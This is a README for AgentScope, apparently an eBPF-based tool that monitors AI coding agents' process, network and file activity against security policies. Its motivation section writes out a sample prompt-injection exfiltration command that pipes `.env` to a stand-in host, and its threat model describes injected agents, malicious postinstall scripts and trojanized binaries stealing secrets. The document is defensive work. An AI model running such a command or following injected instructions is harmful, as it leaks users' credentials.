# AgentScope

**Kernel-grounded runtime security for AI coding agents.** AgentScope watches what your autonomous agents actually *do* — every exec, file open and outbound connection — using eBPF tracepoints on Linux, evaluates each syscall-level event against a declarative policy, and streams violations to a live dashboard. A deterministic simulated-event source keeps the whole demo working on Windows and macOS too.

[![CI](https://github.com/sambai-dev/agentscope/actions/workflows/ci.yml/badge.svg)](https://github.com/sambai-dev/agentscope/actions/workflows/ci.yml)

## Why

Autonomous coding agents (Codex, Claude Code, CI workers) run arbitrary installs, arbitrary network calls and arbitrary file reads — with your tokens in the environment. `npm install` executes postinstall scripts from strangers; a prompt injection can turn "fix this bug" into `cat .env | curl -d @- evil.dev`; a compromised tool binary can quietly download payloads. Application-layer logs are whatever the process says they are. Orgs need an **audit trail grounded in the kernel**: out-of-band capture the agent cannot forge, plus enforcement hooks it cannot talk its way out of.

AgentScope captures:

| Signal | Probe |
| --- | --- |
| Process execution (`exec`) | `sched_process_exec` |
| Outbound connections | `sys_enter_connect` |
| File opens (read/write) | `sys_enter_openat` |

…and evaluates them against rules like *deny package managers*, *flag secret-path access* (`.env`, `.ssh/id_rsa`, AWS credentials, wallets) and *warn on unknown egress domains*.

## Architecture

```text
                    Linux kernel (5.8+)
┌───────────────────────────────────────────────────────┐
│  sched_process_exec   sys_enter_connect   sys_enter_openat
│         │                     │                  │     │
│         └────────── asg-ebpf probes ────────┘        │
│                          RingBuf "EVENTS"             │
└────────────────────────────┬──────────────────────────┘
                             │ JSON records
                    ┌────────▼─────────┐
                    │  asg-collector    │◄── source/sim.rs (deterministic
                    │  (aya userspace)  │      scenario on any OS)
                    └────────┬─────────┘
                             │ tokio mpsc
                    ┌────────▼─────────┐
                    │    asg-api        │  policy engine (asg-policy)
                    │  ingest pipeline  │──► violations ──► metrics
                    └──┬──────┬─────┬───┘
              REST/SSE │      │     │ embedded dashboard
                       ▼      ▼     ▼
                 /v1/*   /api/metrics   index.html (vanilla JS)
```

On non-Linux hosts the collector runs the simulated source instead of loading `bpf/asg.bpf.o`, so `cargo check`, CI and the demo all stay green everywhere.

## Design decisions & tradeoffs

1. **Tracepoints over LSM hooks (for now).** Tracepoints are stable across kernel versions and need no BTF gymnastics or per-version struct layouts; LSM BPF gives stronger enforcement points but demands newer kernels and more maintenance. We start observable, then harden.
2. **cgroup-scoped attribution is roadmap; pid ancestry is now.** The honest way to attribute events to "the agent" is attaching at its cgroup. Today we link processes by `ppid` ancestry from `proc_exec` events, which works for the common agent-shell-child shape but loses grandchildren whose parents exited.
3. **Hand-rolled glob matcher.** Secret-path rules need `**`-style matching over ~10 default patterns. Pulling `globset` for that costs compile time and pulls `regex-automata`; our recursive segment matcher is ~60 lines, dependency-free and exhaustively table-tested.
4. **RingBuf over perf event arrays.** One shared ring preserves global ordering across CPUs, drops samples at the producer (the eBPF program knows), and needs no per-CPU bookkeeping in userspace. Costs a 5.8+ kernel minimum.
5. **JSON on the wire (yes, really).** Each ring record is one serde_json-encoded event. Binary packing would be ~5x smaller/faster, but sharing schema crates between no_std eBPF and userspace complicates the build matrix; JSON keeps the demo honest and the code boring until profiling says otherwise.
6. **A deterministic simulator as a first-class source.** Kernel collection can't run on Windows/macOS CI. Simulating the exact 24-event attack scenario keeps the pipeline, policies and dashboard exercised on every commit — see `examples/scenario.jsonl`.

## Quickstart

```bash
git clone https://github.com/sambai-dev/agentscope && cd agentscope
```

PowerShell (Windows):

```powershell
cargo run -p asg-cli -- serve
# dashboard: http://localhost:8100  (simulated source by default)

curl.exe http://localhost:8100/api/metrics
curl.exe -X POST http://localhost:8100/v1/events -H "content-type: application/json" `
  -d '{\"type\":\"file_open\",\"pid\":1,\"tgid\":2,\"comm\":\"cat\",\"path\":\".env\",\"flags\":0,\"ts_ns\":1787356800000000000,\"is_write_hint\":false}'
```

bash (Linux/macOS):

```bash
cargo run -p asg-cli -- serve

curl -s localhost:8100/healthz
curl -s localhost:8100/api/metrics
curl -s -X POST localhost:8100/v1/events \
  -H 'content-type: application/json' \
  -d "$(sed -n 7p examples/scenario.jsonl)"
```

Replay the full corpus through the pipeline without serving:

```bash
cargo run -p asg-cli -- replay --file examples/scenario.jsonl
```

Real eBPF collection (Linux, root, kernel 5.8+):

```bash
rustup toolchain install nightly --component rust-src
cargo install bpf-linker
(cd bpf/asg-ebpf && cargo +nightly build --release -Z build-std && cp target/bpfel-unknown-none/release/asg-ebpf ../../bpf/asg.bpf.o)
sudo ./target/release/agentscope serve --source kernel --bpf-path bpf/asg.bpf.o
```

## API

| Route | Method | Description |
| --- | --- | --- |
| `/healthz` | GET | Liveness probe, returns `{"status":"ok"}` |
| `/api/metrics` | GET | Prometheus text format (hand-written exposition) |
| `/v1/events` | POST | Ingest one event or an array of events |
| `/v1/events?limit&since_seq` | GET | Stored events with monotonic sequence numbers |
| `/v1/processes` | GET | Live process forest built from `proc_exec` events |
| `/v1/violations?limit` | GET | Policy violations, newest last |
| `/v1/policy` | PUT | Replace the active rule set (audit-logged) |
| `/v1/stream` | GET | Server-Sent Events feed of live events + violations |
| `/` | GET | Embedded security dashboard |

## Dashboard

Single-file vanilla JS (no CDN dependencies), served from the binary via `include_str!`: dark Linear/Vercel-style UI with a pulsing liveness dot, live **process tree**, **network map** (denied hosts red, watch-listed amber), **file-access timeline** with secret hits flagged, a **violations feed** with severity chips, and a **policy editor** that applies rules instantly via `PUT /v1/policy`. Polls every 2 s and subscribes to `/v1/stream` for push updates.

## Benchmarks

Run `cargo run -p asg-cli --bin bench --release` (percentiles are per-op nanoseconds; numbers below from the v0.1.0 run on a Windows dev laptop — re-run for your hardware):

| op           |       n |   p50 |   p95 |   p99 | ops/s |
|--------------|---------|-------|-------|-------|-------|
| policy_eval  | 100_000 | 1,584 | 1,832 | 1,916 | ~621k |
| glob_match   | 200_000 | 1,243 | 1,346 | 1,356 | ~884k |

Full methodology and history in [docs/BENCHMARKS.md](docs/BENCHMARKS.md).

## Threat model

Personas we defend against:

- **Malicious dependency postinstall script** — `npm exec` spawns install scripts that phone home or read credentials. Detected via `PROC_DENIED` (package managers denied by default), `NET_DENIED`/`NET_WARN` egress rules and `SECRET_ACCESS`.
- **Prompt-injected agent exfiltrating `.env`** — the agent reads secret paths and ships them to an unknown host. Detected via `SECRET_ACCESS` on the open and `NET_WARN`/`NET_DENIED` on the connect; the timeline correlates both under one tgid.
- **Compromised tool binary downloading payloads** — a trojanized helper fetches second-stage payloads. Detected via unknown-host egress and `CAP_ESCALATION`.

Guarantees: capture is syscall-level ground truth observed by the kernel, so userland evasion like `LD_PRELOAD` shims or log tampering doesn't help an attacker; collection is out-of-band from the monitored workload.

Non-guarantees: we cannot inspect encrypted payloads; a root attacker can unload probes or alter policy; path-based rules have inherent TOCTOU windows (see [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md)).

## Limitations

- Collection is Linux-only (kernel ≥ 5.8); Windows/macOS run the simulated source.
- The eBPF probes currently emit identity fields only (pid/tgid/comm/ts); argv, destination addresses and open paths arrive via the simulator/replay corpus until argument extraction lands (roadmap).
- No container-escape detection yet.
- State is in-memory only; restarts lose history.

## Roadmap

- LSM BPF programs for true enforcement (deny, not just alert).
- cgroup-scope attachment for container-native attribution.
- ClickHouse archive for long-retention forensics.
- Multi-host collectors fan-in via NATS.
- Systematic comparison work against Tetragon's policy model.

## Deploy

Docker image builds the workspace and runs `asg-cli` with the simulated source by default:

```bash
docker build -t agentscope .
docker run -p 8100:8100 agentscope                      # sim source
docker run --privileged -p 8100:8100 \
  -v $(pwd)/bpf/asg.bpf.o:/app/bpf/asg.bpf.o agentscope # real eBPF needs privileged
```

For Fly.io: ship the sim-source image to any region (it needs no privileges); keep privileged eBPF collectors on your own VMs/bare metal and point the Fly app's policy editor at their `/v1/policy`.

## Announcing

- Show HN draft: [docs/SHOW_HN_DRAFT.md](docs/SHOW_HN_DRAFT.md)
- Reddit post: [docs/REDDIT_POST.md](docs/REDDIT_POST.md)
- Threat model: [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md)
- Benchmark methodology: [docs/BENCHMARKS.md](docs/BENCHMARKS.md)

## License

MIT © 2026 sambai-dev — see [LICENSE](LICENSE).
